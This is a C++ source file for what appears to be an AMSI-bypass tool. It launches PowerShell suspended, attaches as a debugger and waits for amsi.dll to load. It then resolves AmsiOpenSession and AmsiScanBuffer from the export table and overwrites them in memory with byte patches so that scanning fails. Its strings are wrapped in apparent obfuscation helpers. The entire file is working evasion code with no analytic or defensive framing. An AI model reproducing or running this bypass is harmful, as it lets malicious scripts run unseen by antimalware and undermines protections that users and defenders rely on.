#include "DebugAmsi.hpp"


FARPROC GetFunctionAddressFromEAT(HANDLE hProcess, LPVOID baseAddress, const std::string& functionName)
{
	IMAGE_DOS_HEADER dosHeader;
	if (!ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), nullptr))
		throw amsi_exception(ew(L"[-] Failed to read IMAGE_DOS_HEADER: "), GetLastError());

	IMAGE_NT_HEADERS ntHeader;
	if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + dosHeader.e_lfanew, &ntHeader, sizeof(ntHeader), nullptr))
		throw amsi_exception(ew(L"[-] Failed to read IMAGE_NT_HEADERS: "), GetLastError());

	IMAGE_EXPORT_DIRECTORY exportDirectory;
	if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) +
		ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,
		&exportDirectory, sizeof(exportDirectory), nullptr))
		throw amsi_exception(ew(L"[-] Failed to read IMAGE_EXPORT_DIRECTORY: "), GetLastError());

	std::vector<DWORD> functionAddresses(exportDirectory.NumberOfFunctions);
	ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + exportDirectory.AddressOfFunctions,
		functionAddresses.data(), sizeof(DWORD) * exportDirectory.NumberOfFunctions, nullptr);

	std::vector<DWORD> functionNames(exportDirectory.NumberOfNames);
	ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + exportDirectory.AddressOfNames,
		functionNames.data(), sizeof(DWORD) * exportDirectory.NumberOfNames, nullptr);

	std::vector<WORD> functionNameOrdinals(exportDirectory.NumberOfNames);
	ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + exportDirectory.AddressOfNameOrdinals,
		functionNameOrdinals.data(), sizeof(WORD) * exportDirectory.NumberOfNames, nullptr);


	FARPROC functionAddress = nullptr;
	for (DWORD i = 0; i < exportDirectory.NumberOfNames; ++i)
	{
		char exportName[4096] = { 0 };
		if (ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + functionNames[i], exportName, sizeof(exportName), nullptr))
		{
			if (!functionName.compare(exportName))
			{
				DWORD functionOrdinal = functionNameOrdinals[i];
				DWORD functionRelativeVirtualAddress = functionAddresses[functionOrdinal];
				functionAddress = reinterpret_cast<FARPROC>(reinterpret_cast<std::uint8_t*>(baseAddress) + functionRelativeVirtualAddress);
				break;
			}
		}
	}

	return functionAddress;
}

DWORD StartProcessSuspended(std::wstring ProcName, HANDLE& hThread, HANDLE& hProc) {
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOWNORMAL;
	if (!CreateProcess(ProcName.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
		throw amsi_exception(ew(L"[-] Cant Create Suspended Process :"), GetLastError());

	hThread = pi.hThread;
	hProc = pi.hProcess;

#ifdef DEBUG
	std::wcout << ew(L"[+] Process Created Successfully") << std::endl;
#endif

	return pi.dwProcessId;
}

DWORD GetModuleSize(HANDLE hProcess, void* baseAddress)
{
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), nullptr))
		throw amsi_exception(ew(L"[-] Failed to read IMAGE_DOS_HEADER: "), GetLastError());

	IMAGE_NT_HEADERS ntHeader = { 0 };
	if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + dosHeader.e_lfanew, &ntHeader, sizeof(ntHeader), nullptr))
		throw amsi_exception(ew(L"[-] Failed to read IMAGE_NT_HEADERS: "), GetLastError());

	return ntHeader.OptionalHeader.SizeOfImage;
}

int main() {
	DWORD pid;
	handle_helper hThread, hProc;

	try
	{
		pid = StartProcessSuspended(ew(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), hThread.get(), hProc.get());

		if (hProc.get() == INVALID_HANDLE_VALUE)
			throw amsi_exception(ew(L"[-] Cant Open Process Handle: "), GetLastError());

#ifdef DEBUG
		std::wcout << ew(L"[+] Process Handle Opened SuccessFully") << std::endl;
#endif

		if (!DebugActiveProcess(pid))
			throw amsi_exception(ew(L"[-] Failed to attach to process: "), GetLastError());

#ifdef DEBUG
		std::wcout << ew(L"[+] Attached to process with PID: ") << pid << std::endl;
#endif

		if (ResumeThread(hThread.get()) == (DWORD)-1)
			throw amsi_exception(ew(L"[-] Error resuming thread: "), GetLastError());


		HMODULE amsiBase = NULL;
		DEBUG_EVENT debugEvent;
		BOOL processEvents = true;

		while (processEvents)
		{
			WaitForDebugEvent(&debugEvent, INFINITE);

			switch (debugEvent.dwDebugEventCode)
			{
			case LOAD_DLL_DEBUG_EVENT:
			{
				wchar_t szName[MAX_PATH];
				if (GetFinalPathNameByHandle(debugEvent.u.LoadDll.hFile, szName, MAX_PATH, VOLUME_NAME_DOS))
				{
					if (!ew(L"\\\\?\\C:\\Windows\\System32\\amsi.dll").compare(szName)) {
						std::wcout << ew(L"[+] AMSI Base Address: ") << debugEvent.u.LoadDll.lpBaseOfDll << std::endl;
						amsiBase = (HMODULE)debugEvent.u.LoadDll.lpBaseOfDll;
						SIZE_T size = GetModuleSize(hProc.get(), amsiBase);
						std::wcout << ew(L"[+] AMSI Size: ") << size << std::endl;


						PVOID pAddr = GetFunctionAddressFromEAT(hProc.get(), amsiBase, ec("AmsiOpenSession"));
						// xor rax, rax
						std::vector<uint8_t> opPatch = { 0x48, 0x31, 0xC0 };

						if (!WriteProcessMemory(hProc.get(), pAddr, (PVOID)opPatch.data(), opPatch.size(), nullptr))
							throw amsi_exception(ew(L"[-] Error patching AmsiOpenSession: "), GetLastError());

						pAddr = GetFunctionAddressFromEAT(hProc.get(), amsiBase, ec("AmsiScanBuffer"));
						// mov eax, 0x80070057
						// ret
						opPatch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

						if (!WriteProcessMemory(hProc.get(), pAddr, (PVOID)opPatch.data(), opPatch.size(), nullptr))
							throw amsi_exception(ew(L"[-] Error patching AmsiScanBuffer: "), GetLastError());

						std::wcout << ew(L"[+] Patching Complete") << std::endl;
						processEvents = false;
					}
				}
				CloseHandle(debugEvent.u.LoadDll.hFile);
				break;
			}
			case EXIT_PROCESS_DEBUG_EVENT:
				break;
			}

			ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
		}

		if (!DebugActiveProcessStop(pid))
			throw amsi_exception(ew(L"[-] Failed to detach from process: "), GetLastError());
	}
	catch (const amsi_exception& e)
	{
		std::wcout << e.get_winapi_error() << std::endl;
		return EXIT_FAILURE;
	}

	std::wcout << ew(L"[+] Detached from process with PID: ") << pid << std::endl;

	return EXIT_SUCCESS;
}
